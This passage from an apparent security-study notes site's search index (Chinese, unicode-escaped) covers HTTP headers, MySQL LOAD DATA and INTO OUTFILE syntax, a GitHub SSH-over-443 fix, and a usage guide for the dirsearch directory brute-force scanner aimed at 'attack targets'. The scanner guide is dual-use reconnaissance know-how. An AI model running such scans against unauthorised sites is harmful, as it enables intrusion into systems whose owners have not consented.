\u901a\u77e5\u4e2d\u95f4\u7f51\u5173\u6216\u4ee3\u7406\u670d\u52a1\u5668\u5730\u5740\uff0c\u901a\u4fe1\u534f\u8bae ==Warning== \u5173\u4e8e\u6d88\u606f\u5b9e\u4f53\u7684\u8b66\u544a\u4fe1\u606f <p>\u63a5\u4e0b\u6765\u662f Content-Type \u7684\u5177\u4f53\u7c7b\u578b </p> <ol> <li>text/html\uff1aHTML \u683c\u5f0f</li> <li>text/plain\uff1a\u7eaf\u6587\u672c\u683c\u5f0f</li> <li>text/xml\uff1a XML \u683c\u5f0f  </li> <li>image/gif\uff1agif \u56fe\u7247\u683c\u5f0f</li> <li>image/jpeg\uff1ajpg \u56fe\u7247\u683c\u5f0f</li> <li>image/png\uff1apng \u56fe\u7247\u683c\u5f0f  </li> <li>application/json\uff1aJSON \u6570\u636e\u683c\u5f0f</li> <li>application/pdf\uff1apdf \u683c\u5f0f</li> <li>application/octet-stream\uff1a\u4e8c\u8fdb\u5236\u6d41\u6570\u636e\uff0c\u4e00\u822c\u662f\u6587\u4ef6\u4e0b\u8f7d  </li> <li>application/x-www-form-urlencoded\uff1aform \u8868\u5355\u9ed8\u8ba4\u7684\u63d0\u4ea4\u6570\u636e\u7684\u683c\u5f0f\uff0c\u4f1a\u7f16\u7801\u6210 key=value \u683c\u5f0f  </li> <li>multipart/form-data\uff1a \u8868\u5355\u4e2d\u9700\u8981\u4e0a\u4f20\u6587\u4ef6\u7684\u6587\u4ef6\u683c\u5f0f\u7c7b\u578b</li> </ol>"},{"location":"WEB/zhuan/HTTP%E6%8A%A5%E6%96%87/#http_2","title":"HTTP \u534f\u8bae\u54cd\u5e94\u5934","text":"\u540d\u79f0 \u610f\u4e49 Accept-Ranges \u8868\u660e\u670d\u52a1\u5668\u662f\u5426\u652f\u6301\u6307\u5b9a\u8303\u56f4\u8bf7\u6c42\u53ca\u54ea\u79cd\u7c7b\u578b\u7684\u5206\u6bb5\u8bf7\u6c42 ==Access-Control-Allow-Origin== \u5b9a\u54ea\u4e9b\u7ad9\u70b9\u53ef\u4ee5\u53c2\u4e0e\u8de8\u7ad9\u8d44\u6e90\u5171\u4eab Age \u4ece\u539f\u59cb\u670d\u52a1\u5668\u5230\u4ee3\u7406\u7f13\u5b58\u5f62\u6210\u7684\u4f30\u7b97\u65f6\u95f4\uff08\u4ee5\u79d2\u8ba1\uff0c\u975e\u8d1f\uff09 ==Allow== \u5bf9\u67d0\u7f51\u7edc\u8d44\u6e90\u7684\u6709\u6548\u7684\u8bf7\u6c42\u884c\u4e3a\uff0c\u4e0d\u5141\u8bb8\u5219\u8fd4\u56de405 ==Cache-Control== \u544a\u8bc9\u6240\u6709\u7684\u7f13\u5b58\u673a\u5236\u662f\u5426\u53ef\u4ee5\u7f13\u5b58\u53ca\u54ea\u79cd\u7c7b\u578b ==Content-Encoding== \u670d\u52a1\u5668\u652f\u6301\u7684\u8fd4\u56de\u5185\u5bb9\u538b\u7f29\u7f16\u7801\u7c7b\u578b ==Content-Language== \u54cd\u5e94\u4f53\u7684\u8bed\u8a00 Content-Length \u54cd\u5e94\u4f53\u7684\u957f\u5ea6 Content-Location \u8bf7\u6c42\u8d44\u6e90\u53ef\u66ff\u4ee3\u7684\u5907\u7528\u7684\u53e6\u4e00\u5730\u5740 Content-MD5 \u8fd4\u56de\u8d44\u6e90\u7684MD5\u6821\u9a8c\u503c Content-Range \u5728\u6574\u4e2a\u8fd4\u56de\u4f53\u4e2d\u672c\u90e8\u5206\u7684\u5b57\u8282\u4f4d\u7f6e ==Content-Type== \u8fd4\u56de\u5185\u5bb9\u7684MIME\u7c7b\u578b ==Date== \u539f\u59cb\u670d\u52a1\u5668\u6d88\u606f\u53d1\u51fa\u7684\u65f6\u95f4 ETag \u8bf7\u6c42\u53d8\u91cf\u7684\u5b9e\u4f53\u6807\u7b7e\u7684\u5f53\u524d\u503c ==Expires== \u54cd\u5e94\u8fc7\u671f\u7684\u65e5\u671f\u548c\u65f6\u95f4 Last-Modified \u8bf7\u6c42\u8d44\u6e90\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4 ==Location== \u7528\u6765\u91cd\u5b9a\u5411\u63a5\u6536\u65b9\u5230\u975e\u8bf7\u6c42URL\u7684\u4f4d\u7f6e\u6765\u5b8c\u6210\u8bf7\u6c42\u6216\u6807\u8bc6\u65b0\u7684\u8d44\u6e90 Pragma \u5305\u62ec\u5b9e\u73b0\u7279\u5b9a\u7684\u6307\u4ee4\uff0c\u5b83\u53ef\u5e94\u7528\u5230\u54cd\u5e94\u94fe\u4e0a\u7684\u4efb\u4f55\u63a5\u6536\u65b9 Proxy-Authenticate \u5b83\u6307\u51fa\u8ba4\u8bc1\u65b9\u6848\u548c\u53ef\u5e94\u7528\u5230\u4ee3\u7406\u7684\u8be5URL\u4e0a\u7684\u53c2\u6570 refresh \u5e94\u7528\u4e8e\u91cd\u5b9a\u5411\u6216\u4e00\u4e2a\u65b0\u7684\u8d44\u6e90\u88ab\u521b\u9020\uff0c\u57285\u79d2\u4e4b\u540e\u91cd\u5b9a\u5411\uff08\u7531\u7f51\u666f\u63d0\u51fa\uff0c\u88ab\u5927\u90e8\u5206\u6d4f\u89c8\u5668\u652f\u6301\uff09 Retry-After \u5982\u679c\u5b9e\u4f53\u6682\u65f6\u4e0d\u53ef\u53d6\uff0c\u901a\u77e5\u5ba2\u6237\u7aef\u5728\u6307\u5b9a\u65f6\u95f4\u4e4b\u540e\u518d\u6b21\u5c1d\u8bd5 ==Server== \u670d\u52a1\u5668\u8f6f\u4ef6\u540d\u79f0 Set-Cookie \u8bbe\u7f6eHttp Cookie Trailer \u6307\u51fa\u5934\u57df\u5728\u5206\u5757\u4f20\u8f93\u7f16\u7801\u7684\u5c3e\u90e8\u5b58\u5728 ==Transfer-Encoding== \u6587\u4ef6\u4f20\u8f93\u7f16\u7801 Vary \u544a\u8bc9\u4e0b\u6e38\u4ee3\u7406\u662f\u4f7f\u7528\u7f13\u5b58\u54cd\u5e94\u8fd8\u662f\u4ece\u539f\u59cb\u670d\u52a1\u5668\u8bf7\u6c42 Via \u544a\u77e5\u4ee3\u7406\u5ba2\u6237\u7aef\u54cd\u5e94\u662f\u901a\u8fc7\u54ea\u91cc\u53d1\u9001\u7684 Warning \u8b66\u544a\u5b9e\u4f53\u53ef\u80fd\u5b58\u5728\u7684\u95ee\u9898 WWW-Authenticate \u8868\u660e\u5ba2\u6237\u7aef\u8bf7\u6c42\u5b9e\u4f53\u5e94\u8be5\u4f7f\u7528\u7684\u6388\u6743\u65b9\u6848"},{"location":"WEB/zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/","title":"MySQL loaddata\u7528\u6cd5","text":""},{"location":"WEB/zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/#loaddata-load-data-infile","title":"\u4e00\u3001loaddata \u5bfc\u5165\u6570\u636e\u7684\u8bed\u6cd5 load data infile","text":""},{"location":"WEB/zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/#_1","title":"\u57fa\u672c\u8bed\u6cd5","text":"Text Only<pre><code>load data [low_priority] [local] infile 'file_name.txt' [replace|ignore]\ninto table table_name\nfields\n[terminated by '\\t']\n[[OPTIONALLY] enclosed by '']\n[escaped by '\\' ]\n[lines terminated by '\\n']\n[ignore number lines]\n[(col_name,   )]\n</code></pre>"},{"location":"WEB/zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/#_2","title":"\u53c2\u6570\u8bf4\u660e","text":"\u53c2\u00a0 \u00a0 \u00a0\u6570\u00a0\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0\u8bf4\u00a0 \u00a0 \u660e\u00a0 \u00a0 \u00a0 \u00a0\u00a0\u00a0\u5907\u00a0 \u00a0 \u6ce8\u00a0low_priorityMySQL \u5c06\u4f1a\u7b49\u5230\u6ca1\u6709\u5176\u4ed6\u4eba\u8bfb\u8fd9\u4e2a\u8868\u7684\u65f6\u5019\uff0c\u624d\u628a\u6570\u636e\u63d2\u5165load data low_priority infile \"/tmp/harara.sql\" into table orders;local\u8868\u660e\u4ece\u5ba2\u6237\u4e3b\u673a\u8bfb\u6587\u4ef6\u3002\u5982\u679c local \u6ca1\u6307\u5b9a\uff0c\u6587\u4ef6\u5fc5\u987b\u4f4d\u4e8e\u670d\u52a1\u5668\u4e0aload data\u00a0low_priority local infile \"/tmp/harara.sql\" into table orders;\u00a0replace\u5982\u679c\u4f60\u6307\u5b9a replace\uff0c\u65b0\u884c\u5c06\u4ee3\u66ff\u6709\u76f8\u540c\u7684\u552f\u4e00\u5065\u503c\u7684\u73b0\u6709\u884cload data\u00a0low_priority\u00a0local\u00a0infile \"/tmp/harara.sql\" replace into table orders;\u00a0ignore\u5982\u679c\u4f60\u6307\u5b9a ignore\uff0c\u8df3\u8fc7\u6709\u552f\u4e00\u952e\u7684\u73b0\u6709\u884c\u7684\u91cd\u590d\u884c\u8f93\u5165\u00a0load data\u00a0low_priority\u00a0local\u00a0infile \"/tmp/harara.sql\" ignore into table orders;\u00a0fields terminated by\u00a0\u63cf\u8ff0\u5b57\u6bb5\u7684\u5206\u9694\u7b26\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f tab \u5b57\u7b26\uff08\\t\uff09load data infile \"/tmp/harara.sql\" replace into table orders fields terminated by ',' enclosed by '\"'escaped by'\\';\u00a0fields enclosed by\u63cf\u8ff0\u7684\u662f\u5b57\u6bb5\u7684\u62ec\u8d77\u5b57\u7b26\u3002\u00a0fields escaped by\u00a0escaped by \u63cf\u8ff0\u7684\u8f6c\u4e49\u5b57\u7b26\u3002\u9ed8\u8ba4\u7684\u662f\u53cd\u659c\u6760: \\\u00a0\u00a0lines terminated by'\\n'\u6307\u5b9a\u6bcf\u6761\u8bb0\u5f55\u7684\u5206\u9694\u7b26\u9ed8\u8ba4\u4e3a \"\\n\" \u5373\u4e3a\u6362\u884c\u7b26load data infile \"/tmp/harara.sql\" replace into table test fields terminated by ',' lines terminated by '\\n';\u00a0(col_name,)\u53ef\u4ee5\u6309\u6307\u5b9a\u7684\u5217\u628a\u6587\u4ef6\u5bfc\u5165\u5230\u6570\u636e\u5e93\u4e2d<p>\u5f53\u6211\u4eec\u8981\u628a\u6570\u636e\u7684\u4e00\u90e8\u5206\u5185\u5bb9\u5bfc\u5165\uff0c\u9700\u8981\u52a0\u5165\u4e00\u4e9b\u680f\u76ee\uff08\u5217 / \u5b57\u6bb5 / field\uff09\u5230 MySQL \u6570\u636e\u5e93\u4e2d\uff0c\u4ee5\u9002\u5e94\u4e00\u4e9b\u989d\u5916\u7684\u9700\u8981\u3002</p><p>\u6bd4\u5982\uff0c\u6211\u4eec\u8981\u4ece Access \u6570\u636e\u5e93\u5347\u7ea7\u5230 MySQL \u6570\u636e\u5e93\u7684\u65f6\u5019\uff0c\u4e0b\u9762\u7684\u4f8b\u5b50\u663e\u793a\u4e86\u5982\u4f55\u5411\u6307\u5b9a\u7684\u680f\u76ee (field) \u4e2d\u5bfc\u5165\u6570\u636e\uff1a</p><p>load data infile \"/home/harara.sql\" into table orders(order_number,order_date,customer_id)</p>"},{"location":"WEB/zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/#_3","title":"\u5bfc\u5165\u6570\u636e\u5b8c\u6574\u793a\u4f8b","text":"Text Only<pre><code>load data local infile '/var/lib/mysql/emp8/customers.txt' replace into table lf_lanx_tmplp1 character set gbk \nfields terminated by ',' enclosed by '\"' \nlines terminated by '\\n' \n(TMPl_NAME);\n</code></pre>"},{"location":"WEB/zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/#loaddata-select-into-outfile","title":"\u4e8c\u3001loaddata \u5bfc\u51fa\u6570\u636e\u7684\u8bed\u6cd5 select into outfile","text":""},{"location":"WEB/zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/#_4","title":"\u57fa\u672c\u8bed\u6cd5","text":"Text Only<pre><code>select ... into outfile 'file_name'\n        [character set charset_name]\n        [export_options]\n\n\nexport_options:\n     [{fields | columns}\n       [terminated by 'string']\n       [[optionally] enclosed by 'char']\n       [escaped by 'char']\n    ]\n    [lines\n        [starting by 'string']\n        [terminated by 'string']\n    ]\n</code></pre>"},{"location":"WEB/zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/#_5","title":"\u53c2\u6570\u8bf4\u660e","text":"\u53c2\u00a0 \u00a0 \u00a0 \u00a0 \u6570\u00a0 \u00a0 \u00a0\u00a0\u00a0 \u00a0 \u00a0 \u00a0\u8bf4\u00a0 \u00a0 \u00a0 \u00a0 \u00a0\u660e\u00a0 \u00a0 \u00a0 \u00a0fields terminated by 'str'\u8bbe\u7f6e\u5b57\u6bb5\u4e4b\u95f4\u7684\u5206\u9694\u7b26\uff0c\u9ed8\u8ba4\u662f \"\\t\"fields\u00a0 enclosed by 'char'\u8bbe\u7f6e\u5305\u62ec\u4f4f\u5b57\u6bb5\u7684\u503c\u7684\u7b26\u53f7\uff0c\u5982\u5355\u5f15\u53f7\u3001\u53cc\u5f15\u53f7\u7b49\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u4f7f\u7528\u4efb\u4f55\u7b26\u53f7fields optionally enclosed by 'char'\u8bbe\u7f6e\u62ec\u4f4f CHAR\u3001VARCHAR \u548c TEXT \u7b49\u5b57\u7b26\u578b\u5b57\u6bb5\u7684\u5206\u9694\u7b26\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u4f7f\u7528\u4efb\u4f55\u7b26\u53f7fields escaped by 'char'\u8bbe\u7f6e\u8f6c\u4e49\u5b57\u7b26\uff0c\u9ed8\u8ba4\u503c\u4e3a \"\\\"lines starting by 'str'\u8bbe\u7f6e\u6bcf\u884c\u6570\u636e\u5f00\u5934\u7684\u5b57\u7b26\uff0c\u53ef\u4ee5\u4e3a\u5355\u4e2a\u6216\u591a\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u4f7f\u7528\u4efb\u4f55\u5b57\u7b26lines terminated by 'char'\u8bbe\u7f6e\u6bcf\u884c\u6570\u636e\u7ed3\u5c3e\u7684\u5b57\u7b26\uff0c\u53ef\u4ee5\u4e3a\u5355\u4e2a\u6216\u591a\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u503c\u662f \"\\n\""},{"location":"WEB/zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/#_6","title":"\u5b8c\u6574\u5b9e\u4f8b","text":"Text Only<pre><code>SELECT TMPl_NAME INTO OUTFILE 'u/customers.txt' \nFIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '\"'\nLINES TERMINATED BY '\\n'\nFROM LF_LANX_TMPLP1;\n</code></pre>"},{"location":"WEB/zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/#_7","title":"\u53c2\u8003\u5730\u5740:","text":"<p>mybatis \u5904\u7406\u5927\u6279\u91cf\u6570\u636e\u3002\u4f7f\u7528 mysql \u7684 LOAD DATA INFILE :\u00a0https://blog.csdn.net/xcc_2269861428/article/details/83861665</p> <p>mysql \u9ad8\u6548\u5bfc\u5165\u5bfc\u51fa load data [infile][outfile] \u7528\u6cd5 :\u00a0https://www.cnblogs.com/yyy-blog/p/11073855.html</p>"},{"location":"WEB/zhuan/SSH-%E8%BF%9E%E6%8E%A5%E6%97%B6%E9%97%B4%E8%B6%85%E6%97%B6/","title":"SSH:\u8fde\u63a5\u65f6\u95f4\u8d85\u65f6","text":""},{"location":"WEB/zhuan/SSH-%E8%BF%9E%E6%8E%A5%E6%97%B6%E9%97%B4%E8%B6%85%E6%97%B6/#_1","title":"\u95ee\u9898\uff1a","text":"<p>ssh: connect to host github.com port 22: Connection timed out</p> <p>\u6628\u5929\u5728\u4f7f\u7528 VsCode \u5411 GitHub \u4e0a\u4f20\u4ee3\u7801\u65f6\uff0c\u51fa\u73b0\u9519\u8bef\uff1a\uff08\u6b64\u524d\u5df2\u7ecf\u4f7f\u7528 SSH \u7684\u65b9\u5f0f\u8fde\u63a5\u4e86 GitHub \u4ed3\u5e93\uff09</p> Text Only<pre><code>ssh: connect to host github.com port 22: Connection timed out\nPlease make sure you have the correct access rights\nand the repository exists.\n</code></pre> <p>\u9996\u5148\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\u68c0\u67e5 SSH \u662f\u5426\u80fd\u591f\u8fde\u63a5\u6210\u529f\uff08ssh \u540e\u9762\u6709\u7a7a\u683c\uff09</p> Text Only<pre><code>ssh -T git@github.com\n</code></pre> <ul> <li>\u53d1\u73b0\u62a5\u9519\uff1a</li> </ul> Text Only<pre><code>ssh: connect to host github.com port 22: Connection timed out\n</code></pre> <ul> <li>\u7aef\u53e3\u8fde\u63a5\u8d85\u65f6\u3002</li> </ul>"},{"location":"WEB/zhuan/SSH-%E8%BF%9E%E6%8E%A5%E6%97%B6%E9%97%B4%E8%B6%85%E6%97%B6/#_2","title":"\u67e5\u9605\u8d44\u6599\u540e\uff0c\u627e\u5230\u89e3\u51b3\u529e\u6cd5:","text":"<p>\u89e3\u51b3\u65b9\u6848\uff08\u4eb2\u6d4b\u6709\u6548\uff09 \u5728 C \u76d8\u2014\u2014\u7528\u6237\u2014\u2014\u4f60\u7684\u4e3b\u673a\u540d\u6587\u4ef6\u5939\u4e2d\u627e\u5230. ssh \u6587\u4ef6\u5939\uff1b\uff08\u6b64\u524d\u914d\u7f6e SSH \u65f6\u4f1a\u751f\u6210\u8be5\u6587\u4ef6\u5939\uff09 \u5728. ssh \u6587\u4ef6\u5939\u4e2d\u65b0\u5efa\u6587\u4ef6 config, \u4e0d\u5e26\u540e\u7f00\uff08\u53ef\u4ee5\u65b0\u5efa\u6587\u672c\u6587\u6863\uff0c\u53bb\u6389. txt \u540e\u7f00\uff09 \u4f7f\u7528 notepad++\uff08\u6216\u5176\u4ed6\u65b9\u5f0f\uff09\u6253\u5f00 config \u6587\u4ef6\uff0c\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\uff0c\u4fdd\u5b58\u540e\u5373\u53ef</p> Text Only<pre><code>Host github.com\nUser YourEmail\uff08\u4f60\u7684\u90ae\u7bb1\uff09\nHostname ssh.github.com\nPreferredAuthentications publickey\nIdentityFile ~/.ssh/id_rsa\nPort 443\n</code></pre> <ul> <li>\u518d\u6b21\u6267\u884c</li> </ul> Text Only<pre><code>ssh -T git@github.com\n</code></pre> <ul> <li>\u4f1a\u51fa\u73b0\u4ee5\u4e0b\u63d0\u793a\uff0c\u8f93\u5165 yes \u56de\u8f66\u5373\u53ef</li> </ul> Text Only<pre><code>The authenticity of host '[ssh.github.com]:443 ([192.30.255.123]:443)' can't be established.\nRSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '[ssh.github.com]:443,[192.30.255.123]:443' (RSA) to the list of known hosts.\n</code></pre> <ul> <li>\u518d\u6b21\u6267\u884c<code>ssh -T git@github.com</code>\uff0c\u53d1\u73b0\u9a8c\u8bc1\u901a\u8fc7</li> </ul> Text Only<pre><code>Hi Clare! You've successfully authenticated, but GitHub does not provide shell access.\n</code></pre> <ul> <li> <p>\u5b8c\u6210\u4ee5\u4e0a\u6b65\u9aa4\u540e\uff0c\u518d\u6b21\u4e0a\u4f20\u4ee3\u7801\u5230 GitHub \u5c31\u4e0d\u4f1a\u62a5\u9519\u4e86</p> </li> <li> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5047\u5982\u4f60\u7684\u7535\u8111\u4e0a\u62e5\u6709\u591a\u4e2a github \u8d26\u6237\uff0c\u4f60\u53ef\u80fd\u4e8b\u5148\u4fee\u6539\u8fc7 ssh \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4f60\u53ef\u80fd\u4f1a\u5c06\u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u6210\u8fd9\u6837\u5b50\u3002</p> </li> </ul> Text Only<pre><code># For the account1\nHost github_account1\nHostName ssh.github.com\nPreferredAuthentications publickey\nPort 443\nUser git\nIdentityFile ~/.ssh/id_rsa_account1\n\n# For the account2\nHost github_account2\nHostName ssh.github.com\nPreferredAuthentications publickey\nPort 443\nUser git\nIdentityFile ~/.ssh/id_rsa_account2\n</code></pre> <ul> <li>\u76f8\u6bd4\u4e8e\u666e\u901a\u53ea\u914d\u7f6e\u4e00\u4e2a\u8d26\u6237\u7684\u7528\u6237\uff0c\u591a\u8d26\u6237\u7528\u6237\u5728\u8bbe\u7f6e\u8fdc\u7a0b\u4ed3\u5e93\u8fde\u63a5\u65f6\uff0c\u5f80\u5f80\u8bbe\u7f6e\u6210\u8fd9\u4e2a\u6837\u5b50</li> </ul> Text Only<pre><code>[remote \"origin\"]\n    url = git@github_account1:account1/my_repo.git\n</code></pre> <p>\u4f60\u5c06\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bbe\u7f6e\u7684<code>Host</code>\u522b\u540d<code>github_account1</code>\u4ee3\u66ff<code>github.com</code>\u8bbf\u95ee github\uff0c\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u4f60\u60f3\u8981\u8fdb\u884c\u8fdb\u884c git clone \u64cd\u4f5c\uff0c\u4e5f\u5e94\u8be5\u901a\u8fc7\u522b\u540d\u8bbf\u95ee\uff0c\u5426\u5219\u65e0\u6cd5\u8d70 443 \u7aef\u53e3\u3002\u5047\u5982\u4f60\u60f3 clone <code>git@github.com:torvalds/linux.git</code>\uff0c\u4f60\u5e94\u8be5\u4fee\u6539\u4e3a<code>git@\u4f60\u8bbe\u7f6e\u7684\u522b\u540d:torvalds/linux.git</code>\u3002\u6216\u8005\u662f\uff0c\u989d\u5916\u5728\u914d\u7f6e\u6587\u4ef6\u91cc\u52a0\u4e0a\u3002</p> Text Only<pre><code># Just for clone\nHost github.com\nHostName ssh.github.com\nPort 443\nUser git\n</code></pre>"},{"location":"WEB/zhuan/SSH-%E8%BF%9E%E6%8E%A5%E6%97%B6%E9%97%B4%E8%B6%85%E6%97%B6/#_3","title":"\u53c2\u8003","text":"<ul> <li>[1] Using SSH over the HTTPS port</li> <li>[2] ssh: connect to host github.com port 22: Connection timed out</li> <li>[3] https://segmentfault.com/a/1190000040896781</li> <li>[4] https://blog.csdn.net/hdm314/article/details/119947761</li> </ul>"},{"location":"WEB/zhuan/dirsearch%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","title":"dirsearch \u4f7f\u7528\u6307\u5357","text":"<p>\u539f\u6587\uff1ahttps://www.cnblogs.com/akaman98/articles/15958810.html</p> <p>\u57fa\u4e8e python \u5f00\u53d1\u7684 dirsearch \u53ef\u66ff\u4ee3 windows \u5e73\u53f0\u4e0a\u7c7b\u4f3c\u5fa1\u5251\u4e4b\u7c7b\u7684\u76ee\u5f55\u626b\u63cf\u5de5\u5177</p> <p>\u8be5\u5de5\u5177\u7684\u539f\u7406\u5176\u5b9e\u5c31\u662f\u6839\u636e\u5b57\u5178\u6587\u672c\u6784\u9020 url \u8def\u5f84\uff0c\u7136\u540e\u6784\u9020\u8bf7\u6c42\u62a5\u6587\u9010\u4e2a\u53d1\u9001\uff0c\u53ea\u8981\u54cd\u5e94\u62a5\u6587\u7684\u72b6\u6001\u7801\u7b26\u5408\u6761\u4ef6\uff08\u4f8b\u5982\uff1a301\u3001200\uff09\u90a3\u4e48\u5c31\u53ef\u4ee5\u786e\u5b9a\u8fd9\u4e2a\u5730\u5740\u662f\u53ef\u80fd\u5b58\u5728\u76ee\u5f55\u7684\u3002\u9879\u76ee\u5728 github \u4e0a\u5f00\u6e90\u7684\uff0c\u611f\u5174\u8da3\u53ef\u4ee5\u5927\u81f4\u770b\u4e00\u4e0b\u6e90\u7801\u3002</p> <p>\u5982\u679c\u53ea\u60f3\u8981\u50bb\u74dc\u5f0f\u64cd\u4f5c\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u770b <code>\u5b89\u88c5\u53ca\u7b80\u5355\u4f7f\u7528</code> \u8fd9\u4e00\u680f\u5373\u53ef</p> <p>tips: \u8981\u6c42 python3.7 \u4ee5\u4e0a</p>"},{"location":"WEB/zhuan/dirsearch%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/#_1","title":"\u5b89\u88c5\u53ca\u7b80\u5355\u4f7f\u7528","text":"Text Only<pre><code>pip3 install -r requirements.txt  # \u5b89\u88c5\u4e0b\u9700\u8981\u7684\u4f9d\u8d56\npython3 dirsearch.py -u [target_url]  # \u653b\u51fb\u76ee\u6807url\u5730\u5740\uff0c\u53ef\u4ee5\u7528 -u \u53c2\u6570\u6307\u5b9a\u591a\u4e2a\n</code></pre>"},{"location":"WEB/zhuan/dirsearch%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/#_2","title":"\u547d\u4ee4\u53c2\u6570","text":"<p>\u8fd9\u4e2a\u811a\u672c\u5f88\u591a\u529f\u80fd\u53c2\u6570\uff0c\u4f46\u80fd\u7528\u5230\u7684\u53ef\u80fd\u6bd4\u8f83\u5c11\uff0c\u51e0\u4e4e\u90fd\u6709\u9ed8\u8ba4\u914d\u7f6e\uff0c\u5728 <code>default.conf</code> \u4e2d\u53ef\u4ee5\u770b\u5230</p>"},{"location":"WEB/zhuan/dirsearch%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/#_3","title":"\u7248\u672c\u4ee5\u53ca\u5e2e\u52a9\u547d\u4ee4","text":"Text Only<pre><code>--version        \u663e\u793a\u7a0b\u5e8f\u7248\u672c\u53f7\u5e76\u9000\u51fa\n-h               \u663e\u793a\u5e2e\u52a9\u4fe1\u606f\u5e76\u9000\u51fa\n</code></pre>"},{"location":"WEB/zhuan/dirsearch%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/#_4","title":"\u5e38\u7528\u547d\u4ee4\u53c2\u6570","text":"Text Only<pre><code>-u               \u653b\u51fb\u76ee\u6807url\u5730\u5740\uff0c\u53ef\u4ee5\u6307\u5b9a\u591a\u4e2a\uff0c\u901a\u8fc7\u9017\u53f7\u5206\u9694\n-l               url\u5217\u8868\u6587\u4ef6\uff0c\u6bd4\u5982\u4f60\u53ef\u4ee5\u5efa\u4e00\u4e2a targets.txt\uff0c\u91cc\u9762\u5305\u542b\u9700\u8981\u653b\u51fb\u7684\u7f51\u5740\n-e               \u7ad9\u70b9\u6587\u4ef6\u7c7b\u578b\u5217\u8868\uff0c\u5982\uff1aphp,asp\uff0c\u6709\u9ed8\u8ba4\u914d\u7f6e\uff1aphp,aspx,jsp,html,js\uff0c\u57fa\u672c\u4e3b\u6d41\u7684\u683c\u5f0f\u90fd\u5305\u542b\u4e86\n-X               \u4e0d\u9700\u8981\u626b\u63cf\u7684\u7ad9\u70b9\u6587\u4ef6\u7c7b\u578b\u5217\u8868\n-w               \u7528\u6307\u5b9a\u7206\u7834\u5b57\u5178\u6267\u884c\uff0c\u82e5\u5b58\u5728\u591a\u4e2a\u901a\u8fc7\u9017\u53f7\u5206\u9694\n-t               \u6307\u5b9a\u7ebf\u7a0b\u6570\n-i               \u4ec5\u73b0\u5b9e\u6307\u5b9a\u7684\u72b6\u6001\u7801\uff0c\u6307\u5b9a\u591a\u4e2a\u901a\u8fc7\u9017\u53f7\u5206\u9694 \n-x               \u4e0d\u663e\u793a\u6307\u5b9a\u7684\u72b6\u6001\u7801\uff0c\u6307\u5b9a\u591a\u4e2a\u901a\u8fc7\u9017\u53f7\u5206\u9694 \n--exclude-sizes=SIZES               \u4e0d\u663e\u793a\u7684\u54cd\u5e94\u5305\u5927\u5c0f\uff08Example: 123B,4KB\uff09\n--exclude-texts=TEXTS               \u4e0d\u663e\u793a\u7684\u54cd\u5e94\u5305\u5173\u952e\u5b57 (Example: \"Not found\", \"Error\"\uff09\n-m               \u6307\u5b9a\u8bf7\u6c42\u65b9\u5f0f\uff0c\u9ed8\u8ba4GET\n</code></pre>"},{"location":"WEB/zhuan/dirsearch%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/#_5","title":"\u8f83\u4e3a\u51b7\u95e8\u914d\u7f6e","text":"Text Only<pre><code>--cidr=CIDR               \u65e0\u7c7b\u57df\u95f4\u8def\u7531CIDR\n--prefixes=PREFIXES               \u5bf9\u5b57\u5178\u4e2d\u7684\u6bcf\u4e2a\u9879\u6dfb\u52a0\u81ea\u5b9a\u4e49\u524d\u7f00\uff0c\u6bd4\u5982\u5b57\u5178\u4e2d\u6709\u4e2a\u9879\u662fapp\uff0c\u53ea\u8981\u6211\u6307\u5b9a ~,+,=\uff0c\u90a3\u4e48\u5c31\u4f1a\u7206\u7834\u7684\u5b57\u5178\u9879\u4e3a ~app\u3001+app\u3001=app\uff0c\u82e5\u5b58\u5728\u591a\u4e2a\u901a\u8fc7\u9017\u53f7\u5206\u9694\n--suffixes=SUFFIXES               \u6dfb\u52a0\u81ea\u5b9a\u4e49\u540e\u7f00\uff0c\u540c\u4e0a\u82e5\u5b58\u5728\u591a\u4e2a\u901a\u8fc7\u9017\u53f7\u5206\u9694\n-U               \u5b57\u5178\u5168\u90e8\u5927\u5199\n-L               \u5b57\u5178\u5168\u90e8\u5c0f\u5199\n-C               \u9996\u5b57\u6bcd\u5927\u5199\n-d               \u6307\u5b9aHTTP request data\n-H               \u8bbe\u7f6eHTTP\u8bf7\u6c42\u5934\uff0cExample: -H \"Referer: example.com\" -H \"Accept: */*\"\n--random-user-agent=true/false               \u968f\u673auser-agent\u5f00\u5173\n--user-agent=USERAGENT               \u81ea\u5b9a\u4e49\u7528\u6237\u51ed\u8bc1\uff0c\u6bd4\u5982 